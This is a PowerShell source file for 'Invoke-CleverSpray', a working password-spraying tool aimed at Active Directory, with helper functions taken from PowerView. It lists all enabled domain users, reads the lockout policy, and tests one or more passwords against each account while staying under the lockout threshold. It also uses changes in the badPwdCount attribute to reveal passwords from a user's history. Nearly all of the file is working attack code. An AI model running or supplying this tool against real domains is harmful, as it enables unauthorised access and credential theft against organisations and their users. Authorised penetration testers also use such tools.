<#
	Function: Invoke-CleverSpray
	Author : Francois Lelievre (@dafanch)
    Taking profit of: Convert-LDAPProperty, Get-NetDomain and Get-NetUser from PowerView - by Will Schroeder (@harmj0y)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    TO DO : 
        > ADD -User or -UserList
        > ADD -Group
        > ADd -OU  

#>


function Invoke-CleverSpray {
<#
    .SYNOPSIS
        Try to authenticate with all the users' accounts of the current user's domain.
        Detects if the provided password is in users' passwords history by checking the incrementation of the user account's badPasswdCount attribute
        Another -Domain can be specified to query for users across a trust.
    
    .PARAMETER Password
        Password to spray.

	.PARAMETER PasswordFile
        Path to file containing the list of passwords to spray.

    .PARAMETER UserFile
        Path to file containing the list of users to attack.

	.PARAMETER Limit
        Integer to substract to "badPwdCount" to avoid blocking accounts (must be at least 2 ; default is 2)

	.PARAMETER HideOld
        Hide old password discovered (default is false)

    .PARAMETER Delay
        Delay between authentication attemps

	.PARAMETER Domain
        The domain to query for users, defaults to the current domain.
		
#>

    param(
        [String]
        $Password,
		
		[String]
        $PasswordFile,

        [String]
        $User,

        [String]
        $UserFile,
		
		[Int]
		$Limit = 2,
		
		[Switch]
		$HideOld,

        [Int]
        $Delay = 0,

        [String]
        $Domain
    )
	
	# Get current DOMAIN if not set as a parameter (using PowerView) and get the PDCe DC
	if ($Domain -eq "") {
		Try {
			$Domain = (Get-NetDomain).name
			$DomainController = ((Get-NetDomain).PdcRoleOwner).name
		}
		Catch {
            Write-Host "[-] Domain cannot be retrieved..." -ForegroundColor Red
			Return
        }
    }
	# Else get the DOMAIN set as parameter PDCe DC
	else {
        $DomainController = ((Get-NetDomain -Domain $Domain).PdcRoleOwner).name
		if ($DomainController -eq $null){
			Write-Host "[-] Domain cannot be retrieved..." -ForegroundColor Red
			Return
		}
	}


    if($PasswordFile -And ($Password -eq "")){
        Try {
            $PasswordList = Get-Content $PasswordFile
            if ($PasswordList.Count -le 1){
                Write-Host "[-] Password file must contain at least 2 passwords...Please use the -Password option to specify a unique password to spray"
                Return
            }
        }
        Catch {
            Write-Host "[-] Invalid Password File $PasswordFile" -ForegroundColor Red	
			Return			
        }
    }
	# If a Password is given
	elseif ($Password -And ($PasswordFile -eq "")){
		Write-Host "[!] Password to test on $Domain user accounts against the PDCe $DomainController : $Password" -ForegroundColor Gray
		$PasswordList = $Password
	}
	# If a Password and a PasswordFile is given, return an error (if they are both empty or not empty)
	elseif ( (($Password -eq "") -And ($PasswordFile -eq "")) -Or ($Password -And $PasswordFile)) {
		Write-Host "[-] Please specify either a password (-Password) or a path to a file containing passwords (-PasswordFile)" -ForegroundColor Red;
		Return
	}

	$Users = Get-NetUser -DomainController $DomainController -Domain $Domain -filter "(!userAccountControl:1.2.840.113556.1.4.803:=2)"
	
	$NbUsers = $Users.count
	
	# Get the Domain lockout policy
	$LockOutThreshold = Get-LockOutThreshold
	
	
    if ($LockOutThreshold -eq -1){
        Write-Host "[!] Awesome, user accounts can never be locked out !" -ForegroundColor Gray
		#set a high value to represent that accounts can never be locked
		$LockOutThresholdMinusLimit = 1000000000
    } else {
        Write-Host "[!] Current lockout threshold is $LockOutThreshold" -ForegroundColor Gray
        $LockOutThresholdMinusLimit = $LockOutThreshold - $Limit
        Write-Host "[!] Only users having 'badpwdcount' attribute lower or equal to $LockOutThresholdMinusLimit will be tested ($LockOutThreshold-$Limit)..." -ForegroundColor Gray
        Write-Host "     > Use the Limit parameter (-Limit) to lower this value and decrease the risks of blocking user accounts (default is 2)" -ForegroundColor Gray
	
    }
	if ($Limit -lt 2){
		Write-Host "[-] To avoid locking user accounts, please set a limit greater or equal to 2..." -ForegroundColor Red
		Return
	}
	if (($Limit -gt $LockOutThreshold) -And ($LockOutThreshold -ne -1)){
		Write-Host "[-] Limit cannot be superior to the current lockout threshold $LockOutThreshold..." -ForegroundColor Red
		Return
	}
	
	#initiate password counter (usefull when a PasswordList is given)
	$PasswordCounter = 0
    $TotalNbOldPwdDiscovered = 0
    $TotalNbCurrentPwdDiscovered = 0
    $AllCurrentPwdDiscovered = ""
    $AllOldPwdDiscovered = ""
	
	Do {
		#initiate UserCounter to print progress (%) of the attack while spraying
		$UserCounter = 0
		#if a PasswordFile is given, set the password to spray to the next password in the list
		if ($PasswordFile){
			$CurrentPassword = $PasswordList[$PasswordCounter]
		}
		#Else set the password to spray to the Password parameter 
		else {
			$CurrentPassword = $Password
		}

		Write-Host "`n[*] The password $CurrentPassword will now be tested on $NbUsers users" -ForegroundColor Gray
        
        $NbOldPwdDiscovered = 0
        $NbCurrentPwdDiscovered = 0

		ForEach ($UserString in $Users) {

            $SamAccountName = (@($UserString)).samaccountname

			# Retrieve value of user's badPwdCount attribute on the PDCe DC !
			$currBadPwdCount = (Get-NetUser -DomainController $DomainController -Domain $Domain  -UserName $SamAccountName | select badpwdcount).badpwdcount
			# If accounts are never locked or the current user badPwdCount attribute is lower than the Threshold - Limit, go for it !
			if (($LockOutThreshold -eq -1) -or ($currBadPwdCount -le $LockOutThresholdMinusLimit)) {
                
				$authResult = Test-ADAuthentication -DomainController $DomainController -UserName $SamAccountName -Password $CurrentPassword
				if ($authResult) {
					Write-Host "[+] Success: $SamAccountName $CurrentPassword" -ForegroundColor Green
                    $AllCurrentPwdDiscovered += " - $SamAccountName $CurrentPassword`n"
					$NbCurrentPwdDiscovered++
                    $TotalNbCurrentPwdDiscovered++
                
				}
				
				else {
					$newBadPwdCount = (Get-NetUser -DomainController $DomainController -Domain $Domain  -UserName $SamAccountName | select badpwdcount).badpwdcount
					if (($newBadPwdCount -eq $currBadPwdCount) -And (-Not $HideOld)) {
						Write-Host "[+] Old password detected: $SamAccountName $CurrentPassword" -ForegroundColor Yellow
						$AllOldPwdDiscovered += " - $SamAccountName $CurrentPassword`n"
                        $NbOldPwdDiscovered++
                        $TotalNbOldPwdDiscovered++
					}
				}
				Start-Sleep -Milliseconds $Delay
				$UserCounter++
				
				if ($UserCounter % 100 -eq 0) {
					Write-Host "[!] $UserCounter/$NbUsers user accounts tested..." -ForegroundColor Gray
				}
			}
		}
		
		$PasswordCounter++

        if (($NbOldPwdDiscovered -eq 0) -And ($NbCurrentPwdDiscovered -eq 0)){
            Write-Host "[-] No old or current password discovered using the password $CurrentPassword" -ForegroundColor Red
        }
	
	} While ( $PasswordCounter -le ([int]($PasswordList.Count)-1) )

    Write-Host "`n[!] Finished spraying !" -ForegroundColor Green
    Write-Host "[!] Number of valid passwords found: $TotalNbCurrentPwdDiscovered :" -ForegroundColor Green
    Write-Host $AllCurrentPwdDiscovered
    Write-Host "[!] Number of previous passwords found: $TotalNbOldPwdDiscovered :" -ForegroundColor Yellow
    Write-Host $AllOldPwdDiscovered
	
}


<#
    .SYNOPSIS
        Test authentication
    .PARAMETER UserName
        Username.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER Password
        Password.
#>
function Test-ADAuthentication($DomainController, $UserName, $Password) {
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
    $pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext $ct,$DomainController
    return $pc.ValidateCredentials($UserName,$Password, 1)
}

<#
    .SYNOPSIS
        Detects current domain LockOutThreshold
#>
function Get-LockOutThreshold {
	$LockOutThreshold = (net accounts)[5].ToString().split(" ")[-1];
    #If LockOutThreshold is (int) then set this value else if it is a string ("never") accounts get never locked so set it to -1
    If ($LockOutThreshold -match '^\d+$'){
	    return $LockOutThreshold;
    }
    Else
    {
	    return -1
    }
}


<#
    PowerSploit Function: PowerView.ps1
    Author: Will Schroeder (@harmj0y)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
#>
filter Get-NetDomain {
<#
    .SYNOPSIS
        Returns a given domain object.
    .PARAMETER Domain
        The domain name to query for, defaults to the current domain.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-NetDomain -Domain testlab.local
    .EXAMPLE
        PS C:\> "testlab.local" | Get-NetDomain
    .LINK
        http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
#>

    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        $Credential
    )

    if($Credential) {
        
        Write-Verbose "Using alternate credentials for Get-NetDomain"

        if(!$Domain) {
            # if no domain is supplied, extract the logon domain from the PSCredential passed
            $Domain = $Credential.GetNetworkCredential().Domain
            Write-Verbose "Extracted domain '$Domain' from -Credential"
        }
   
        $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        
        try {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
        }
        catch {
            Write-Verbose "The specified domain does '$Domain' not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid."
            $Null
        }
    }
    elseif($Domain) {
        $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
        try {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
        }
        catch {
            Write-Verbose "The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust."
            $Null
        }
    }
    else {
        [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    }
}

<#
    PowerSploit Function: PowerView.ps1
    Author: Will Schroeder (@harmj0y)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
#>
filter Get-DomainSearcher {
<#
    .SYNOPSIS
        Helper used by various functions that takes an ADSpath and
        domain specifier and builds the correct ADSI searcher object.
    .PARAMETER Domain
        The domain to use for the query, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.
    .PARAMETER ADSprefix
        Prefix to set for the searcher (like "CN=Sites,CN=Configuration")
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-DomainSearcher -Domain testlab.local
    .EXAMPLE
        PS C:\> Get-DomainSearcher -Domain testlab.local -DomainController SECONDARY.dev.testlab.local
#>

    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    if(-not $Credential) {
        if(-not $Domain) {
            $Domain = (Get-NetDomain).name
        }
        elseif(-not $DomainController) {
            try {
                # if there's no -DomainController specified, try to pull the primary DC to reflect queries through
                $DomainController = ((Get-NetDomain).PdcRoleOwner).Name
            }
            catch {
                throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
            }
        }
    }
    elseif (-not $DomainController) {
        # if a DC isn't specified
        try {
            $DomainController = ((Get-NetDomain -Credential $Credential).PdcRoleOwner).Name
        }
        catch {
            throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
        }

        if(!$DomainController) {
            throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
        }
    }

    $SearchString = "LDAP://"

    if($DomainController) {
        $SearchString += $DomainController
        if($Domain){
            $SearchString += '/'
        }
    }

    if($ADSprefix) {
        $SearchString += $ADSprefix + ','
    }

    if($ADSpath) {
        if($ADSpath -Match '^GC://') {
            # if we're searching the global catalog
            $DN = $AdsPath.ToUpper().Trim('/')
            $SearchString = ''
        }
        else {
            if($ADSpath -match '^LDAP://') {
                if($ADSpath -match "LDAP://.+/.+") {
                    $SearchString = ''
                }
                else {
                    $ADSpath = $ADSpath.Substring(7)
                }
            }
            $DN = $ADSpath
        }
    }
    else {
        if($Domain -and ($Domain.Trim() -ne "")) {
            $DN = "DC=$($Domain.Replace('.', ',DC='))"
        }
    }

    $SearchString += $DN
    Write-Verbose "Get-DomainSearcher search string: $SearchString"

    if($Credential) {
        Write-Verbose "Using alternate credentials for LDAP connection"
        $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
    }
    else {
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    }

    $Searcher.PageSize = $PageSize
    $Searcher.CacheResults = $False
    $Searcher
}


<#
    PowerSploit Function: PowerView.ps1
    Author: Will Schroeder (@harmj0y)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
#>
function Convert-LDAPProperty {
<#
    .SYNOPSIS
    
        Helper that converts specific LDAP property result fields.
        Used by several of the Get-Net* function.
    .PARAMETER Properties
        Properties object to extract out LDAP fields for display.
#>
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if (($_ -eq "objectsid") -or ($_ -eq "sidhistory")) {
            # convert the SID to a string
            $ObjectProperties[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value
        }
        elseif($_ -eq "objectguid") {
            # convert the GUID to a string
            $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
        }
        elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") -or ($_ -eq "lastlogoff") -or ($_ -eq "badPasswordTime") ) {
            # convert timestamps
            if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                # if we have a System.__ComObject
                $Temp = $Properties[$_][0]
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
            }
            else {
                $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
            }
        }
        elseif($Properties[$_][0] -is [System.MarshalByRefObject]) {
            # try to convert misc com objects
            $Prop = $Properties[$_]
            try {
                $Temp = $Prop[$_][0]
                Write-Verbose $_
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
            }
            catch {
                $ObjectProperties[$_] = $Prop[$_]
            }
        }
        elseif($Properties[$_].count -eq 1) {
            $ObjectProperties[$_] = $Properties[$_][0]
        }
        else {
            $ObjectProperties[$_] = $Properties[$_]
        }
    }

    New-Object -TypeName PSObject -Property $ObjectProperties
}


<#
    PowerSploit Function: PowerView.ps1
    Author: Will Schroeder (@harmj0y)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
#>
function Get-NetUser {
<#
    .SYNOPSIS
        Query information for a given user or users in the domain
        using ADSI and LDAP. Another -Domain can be specified to
        query for users across a trust.
        Replacement for "net users /domain"
    .PARAMETER UserName
        Username filter string, wildcards accepted.
    .PARAMETER Domain
        The domain to query for users, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.
    .PARAMETER Filter
        A customized ldap filter string to use, e.g. "(description=*admin*)"
    .PARAMETER AdminCount
        Switch. Return users with adminCount=1.
    .PARAMETER SPN
        Switch. Only return user objects with non-null service principal names.
    .PARAMETER Unconstrained
        Switch. Return users that have unconstrained delegation.
    .PARAMETER AllowDelegation
        Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-NetUser -Domain testing
    .EXAMPLE
        PS C:\> Get-NetUser -ADSpath "LDAP://OU=secret,DC=testlab,DC=local"
#>

    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [String]
        $UserName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $Filter,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Switch]
        $Unconstrained,

        [Switch]
        $AllowDelegation,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        # so this isn't repeated if users are passed on the pipeline
        $UserSearcher = Get-DomainSearcher -Domain $Domain -ADSpath $ADSpath -DomainController $DomainController -PageSize $PageSize -Credential $Credential
    }

    process {
        if($UserSearcher) {

            # if we're checking for unconstrained delegation
            if($Unconstrained) {
                Write-Verbose "Checking for unconstrained delegation"
                $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }
            if($AllowDelegation) {
                Write-Verbose "Checking for users who can be delegated"
                # negation of "Accounts that are sensitive and not trusted for delegation"
                $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))"
            }
            if($AdminCount) {
                Write-Verbose "Checking for adminCount=1"
                $Filter += "(admincount=1)"
            }

            # check if we're using a username filter or not
            if($UserName) {
                # samAccountType=805306368 indicates user objects
                $UserSearcher.filter="(&(samAccountType=805306368)(samAccountName=$UserName)$Filter)"
            }
            elseif($SPN) {
                $UserSearcher.filter="(&(samAccountType=805306368)(servicePrincipalName=*)$Filter)"
            }
            else {
                # filter is something like "(samAccountName=*blah*)" if specified
                $UserSearcher.filter="(&(samAccountType=805306368)$Filter)"
            }

            $Results = $UserSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                # convert/process the LDAP fields for each result
                $User = Convert-LDAPProperty -Properties $_.Properties
                $User.PSObject.TypeNames.Add('PowerView.User')
                $User
            }
            $Results.dispose()
            $UserSearcher.dispose()
        }
    }
}